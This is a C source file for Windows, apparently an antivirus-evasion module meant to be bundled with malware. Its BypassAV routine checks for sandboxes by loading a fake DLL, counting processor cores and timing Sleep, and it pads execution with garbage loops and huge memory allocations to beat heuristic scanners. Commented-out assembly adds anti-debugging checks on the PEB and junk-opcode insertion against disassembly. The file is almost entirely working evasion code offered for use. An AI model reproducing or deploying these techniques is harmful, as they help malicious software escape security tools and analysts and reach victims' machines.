#include <windows.h>


//########################## OVERALL FUNCTIONS ##########################
bool BypassAV();// Several dynamic/heuristic scan bypass methods
void HideWindow();
void Bunny(); // Implements several obfuscation methods for making it harder to reverse engineer
void Hop1();
void Hop2();
void Hop3();
void Hop4();
void Hop5();
//########################## OVERALL FUNCTIONS ##########################


//######## DYNAMIC/HEURISTIC SCAN BYPASS ########
bool BypassAV(){
	Bunny();// }=> Obfuscate the code with function calls and garbage memory allocations...


	HINSTANCE DLL = LoadLibrary(TEXT("fake.dll")); //}
	if(DLL != NULL){//								 |
		BypassAV();					//				 |=> Try to load a fake dll... 
	}//												 }


/*

	// bool WINAPI IsDebuggerPresent(void);
	__asm
	{
	CheckDebugger:
  		PUSH EAX                    // Save the EAX value to stack
  		MOV EAX, [FS:0x30]          // Get PEB structure address
  		MOV EAX, [EAX+0x02]         // Get being debugged byte
  		TEST EAX, EAX               // Check if being debuged byte is set
  		JNE CheckDebugger           // If debugger present check again
  		POP EAX                     // Put back the EAX value
	}



	__asm
	{
		PUSHF 						// Push all flags to stack
		MOV DWORD [ESP], 0x100		// Set 0x100 to the last flag on the stack
		POPF 						// Put back all flags register values		
	}

*/


	SYSTEM_INFO SysGuide;//                         	}
	GetSystemInfo(&SysGuide);//							|
	int CoreNum = SysGuide.dwNumberOfProcessors;//		|
	if(CoreNum < 2){//									|=> Check the number of processor cores...
		BypassAV();					//					|
	}//													}


/*
	__asm 					// This method inserts garbage opcode 
	{
 		PUSH EAX 			// Save EAX value to stack
		XOR EAX,EAX  		// Zero out the EAX
        JZ True 			// This statement will always be true
		__asm __emit(0xea) 			// Insert long jump opcode
	True:
		POP EAX 			// Put back the old EAX value
	}

*/


	//							     }
	int Tick = GetTickCount();     //| 
	Sleep(1000);			       //|
	int Tac = GetTickCount();      //|
	if((Tac - Tick) < 1000){   	   //|=> Check if the sleep function is skipped...
		BypassAV();				   //|
	}						       //|
	//							     }																

/*
	__asm // Check global flags
	{
	CheckGlobalFlags:
		PUSH EAX
		MOV EAX, FS:[0x30]
		MOV EAX, [EAX+0x68]
		AND EAX, 0x70
		TEST EAX, EAX
		JNE CheckGlobalFlags
	}

*/

	Bunny();//}=> Obfuscate the code with function calls and garbage memory allocations...

	return true;
}//######## DYNAMIC/HEURISTIC SCAN BYPASS ########



void Bunny(){

	double Max = 9999999;
	double Needle = 0;
	for(double i = 0; i < Max; i++){
		Needle++;
	}


	for(int i = 0; i < 8; i++){
		Hop1();
		Hop2();
		Hop3();
		Hop4();
		Start:;
		i++;
		Hop5();
		if((i % 3) == 0){
			goto Start;	
		}
		
	}

}



void Hop1(){
/*
	__asm			// False function prologue
	{
		PUSH EBP
		MOV EBP,ESP
		POP EBP
	}
*/

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
/*
	__asm 					// This method inserts garbage opcode 
	{
 		PUSH EAX 			// Save EAX value to stack
		XOR EAX,EAX  		// Zero out the EAX
        JZ True 			// This statement will always be true
		__asm __emit(0xea) 	// Insert long jump opcode
	True:
		POP EAX 			// Put back the old EAX value
	}
*/
}
void Hop2(){

/*
	__asm			// False function prologue
	{
		PUSH EBP
		MOV EBP,ESP
		POP EBP
	}
*/

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
/*
	__asm 					// This method inserts garbage opcode 
	{
 		PUSH EAX 			// Save EAX value to stack
		XOR EAX,EAX  		// Zero out the EAX
        JZ True 			// This statement will always be true
		__asm __emit(0xea) 	// Insert long jump opcode
	True:
		POP EAX 			// Put back the old EAX value
	}
*/
}
void Hop3(){
/*
	__asm			// False function prologue
	{
		PUSH EBP
		MOV EBP,ESP
		POP EBP
	}
*/

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
/*
	__asm 					// This method inserts garbage opcode 
	{
 		PUSH EAX 			// Save EAX value to stack
		XOR EAX,EAX  		// Zero out the EAX
        JZ True 			// This statement will always be true
		__asm __emit(0xea) 	// Insert long jump opcode
	True:
		POP EAX 			// Put back the old EAX value
	}
*/
}
void Hop4(){
/*
	__asm			// False function prologue
	{
		PUSH EBP
		MOV EBP,ESP
		POP EBP
	}
*/

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
/*
	__asm 					// This method inserts garbage opcode 
	{
 		PUSH EAX 			// Save EAX value to stack
		XOR EAX,EAX  		// Zero out the EAX
        JZ True 			// This statement will always be true
		__asm __emit(0xea) 	// Insert long jump opcode
	True:
		POP EAX 			// Put back the old EAX value
	}
*/
}
void Hop5(){

/*
	__asm			// False function prologue
	{
		PUSH EBP
		MOV EBP,ESP
		POP EBP
	}
*/

	char * Memdmp = NULL;
	Memdmp = (char *)malloc(100000000);
	if(Memdmp != NULL){
		memset(Memdmp, 00, 100000000);
		free(Memdmp);
	}
/*
	__asm 					// This method inserts garbage opcode 
	{
 		PUSH EAX 			// Save EAX value to stack
		XOR EAX,EAX  		// Zero out the EAX
        JZ True 			// This statement will always be true
		__asm __emit(0xea) 	// Insert long jump opcode
	True:
		POP EAX 			// Put back the old EAX value
	}
*/
}


